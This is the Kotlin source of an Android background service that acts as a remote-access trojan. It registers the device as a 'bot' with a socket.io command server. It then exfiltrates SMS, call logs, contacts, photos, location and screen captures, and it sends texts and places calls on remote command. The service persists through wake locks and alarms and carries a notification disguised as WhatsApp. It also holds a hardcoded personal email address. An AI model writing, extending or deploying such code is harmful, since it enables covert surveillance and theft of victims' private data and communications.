package me.hawkshaw.services

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.IBinder
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import me.hawkshaw.tasks.*
import org.json.JSONArray
import org.json.JSONObject
import android.net.Uri
import android.support.v4.app.ActivityCompat
import me.hawkshaw.utils.CommonParams
import me.hawkshaw.utils.Constants
import me.hawkshaw.activities.ScreenProjectionActivity
import android.os.PowerManager
import android.support.v4.app.NotificationCompat
import me.hawkshaw.R


class CommandService : Service() {


    private val tag = "suthar"
    private val prefs by lazy { this.getSharedPreferences("com.android.hawkshaw", Context.MODE_PRIVATE) }

    private val powerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
    private val wakeLock by lazy { powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK or PowerManager.ON_AFTER_RELEASE, "commandService") }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(tag, "On create Called")
        createSocket(Constants.DEVELOPMENT_SERVER)

        //if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) startForeground()
        setRepeatingAlarm()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        Log.i(tag, "Running onStartCommand")
        Log.i(tag, "\n\n\nSocket is " + if (Constants.socket?.connected() == true) "connected" else "not connected\n\n\n")

        if (Constants.socket?.connected() == false) {
            Log.i(tag, "Socket is connecting ......\n")
            Constants.socket?.connect()
        }

        return Service.START_STICKY
    }

    private fun createSocket(server: String) {

        val socket = IO.socket(server)
        Constants.socket = socket

        val params = CommonParams(this)

        socket.on(Socket.EVENT_CONNECT) {

            Log.i(tag, "\n\nSocket connected\n\n")
            wakeLock.acquire(60 * 60 * 1000)

            val bot = JSONObject()
            bot.put("uid", params.uid)
            bot.put("serial", params.serial)
            bot.put("provider", params.provider)
            bot.put("device", params.device)
            bot.put("sdk", params.sdk)
            bot.put("version", params.version)
            bot.put("phone", params.phone)
            bot.put("location", LocationMonitor(this, socket).getLastLocation())
            bot.put("email", prefs.getString("email", "abhinav.suthar.50@gmail.com"))
            bot.put("socket_id", socket.id())
            val prevClientID = prefs.getString("clientID", "whatever")
            Log.d(tag, "Prev client Id $prevClientID")
            bot.put("prevClientID", prefs.getString("clientID", "whatever"))

            socket.emit("bot-login", bot)
        }

        socket.on("commands") { args ->

            val cmds = args[0] as JSONArray

            for (i in 0..(cmds.length() - 1)) {
                val cmd = cmds.getJSONObject(i)

                val command = cmd.get("command") as String
                Log.i(tag, "\nCommand: " + cmd.toString() + "\n")


                when (command) {

                    "getSms" -> {
                        val arg1 = Integer.parseInt(cmd.get("arg1").toString())
                        SmsTask(this, arg1, socket).start()
                    }

                    "getCallHistory" -> {
                        val arg1 = Integer.parseInt(cmd.get("arg1").toString())
                        CallLogsTask(this, arg1, socket).start()
                    }

                    "getContacts" -> {
                        ContactsTask(this, socket).start()
                    }

                    "addContact" -> {
                        val phone = cmd.get("arg1").toString()
                        val name = cmd.get("arg2").toString()
                        AddNewContact(this, phone, name).start()
                    }

                    "getLocation" -> {
                        LocationMonitor(this, socket).start()
                    }

                    "sendSms" -> {
                        val phoneNumber = cmd.get("arg1").toString()
                        val textMessage = cmd.get("arg2").toString()
                        SendSmsTask(this, textMessage, phoneNumber, socket).start()
                    }

                    "getImages" -> {
                        PhotosTask(this, socket).start()
                    }

                    "downloadImage" -> {
                        val path = cmd.get("arg1").toString()
                        DownloadImage(this, socket, path).start()
                    }

                    "openBrowser" -> {

                        val url = cmd.get("arg1").toString()

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse("http://$url")
                        intent.`package` = "com.android.chrome"  // package of ChromeBrowser App
                        startActivity(intent)
                    }

                    "takeScreenShot" -> {
                        val intent = Intent(this, ScreenProjectionActivity::class.java)
                        startActivity(intent)
                    }

                    "streamScreen" -> {
                        val intent = Intent(this, ScreenProjectionActivity::class.java)
                        intent.putExtra("streamScreen", true)
                        startActivity(intent)
                    }

                    "streamCamera" -> {
                        //I don't know how to stream yet!
                    }

                    "openApp" -> {
                        val appPackage = cmd.get("arg1").toString()
                        val intent: Intent = packageManager.getLaunchIntentForPackage(appPackage)
                        startActivity(intent)
                    }

                    "openWhatsApp" -> {
                        val number = cmd.get("arg1").toString()
                        val text = cmd.get("arg2")?.toString() ?: ""
                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$text")))
                    }

                    "makeCall" -> {
                        val number = cmd.get("arg1")
                        val intent = Intent(Intent.ACTION_CALL)
                        intent.data = Uri.parse("tel:$number")
                        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)
                            startActivity(intent)
                    }

                    "notification" -> {
                        // Way too long
                    }

                    "fileExplorer" -> {
                        // It will take long
                    }

                    "clientID" -> {
                        val clientID = cmd.get("arg1").toString()
                        prefs.edit().putString("clientID", clientID).commit()
                        Log.d(tag, "ClientID: $clientID")
                    }

                    "stopAll" -> {
                        PhotosTask.flag = false
                        StreamScreen.flagStop = true
                        LocationMonitor.locationUpdates = false
                    }

                    else -> {
                        Log.i(tag, "Unknown command")
                        val xcmd = JSONObject()
                        xcmd.put("event", "command:unknown")
                        xcmd.put("uid", params.uid)
                        xcmd.put("device", params.device)
                        xcmd.put("command", command)
                    }
                }
            }
        }

        socket.on(Socket.EVENT_DISCONNECT) {

            Log.i(tag, "\n\nSocket disconnected...\n\n")
            PhotosTask.flag = false
            StreamScreen.flagStop = true
            LocationMonitor.locationUpdates = false

            socket.off("usrDataResult")
            wakeLock.release()
        }

        socket.on(Socket.EVENT_RECONNECTING) { Log.i(tag, "Socket reconnecting...") }
    }

    override fun onDestroy() {
        wakeLock.release()
        Log.d(tag, "On destroy Called")
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        wakeLock.release()
        Log.d(tag, "On task removed Called")
        super.onTaskRemoved(rootIntent)
    }

    private fun setRepeatingAlarm() {

        val intent = Intent(this, MyReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(applicationContext, 99, intent, PendingIntent.FLAG_UPDATE_CURRENT)

        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.cancel(pendingIntent)
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60 * 1000, 10 * 60 * 1000, pendingIntent)

    }

    private fun startForeground() {

        val notification = NotificationCompat.Builder(this, "channelId")
                .setSmallIcon(R.drawable.ic_whatsapp)
                .setContentTitle("WhatsApp")
                .setContentText("Checking for new messages...")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build()

        startForeground(98, notification)
    }

}